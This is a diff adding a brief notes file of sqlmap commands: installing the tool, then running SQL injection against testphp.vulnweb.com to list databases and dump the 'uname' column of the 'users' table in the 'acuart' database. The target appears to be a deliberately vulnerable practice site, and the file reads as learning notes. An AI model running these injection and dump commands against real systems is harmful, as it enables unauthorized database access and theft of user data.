@@ -1,0 +1,8 @@
+Commands :
+# apt-get install sqlmap
+# sqlmap -hh 
+# sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs
+# sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1  -D acuart -T users -C uname --dump
+#
+#
+#
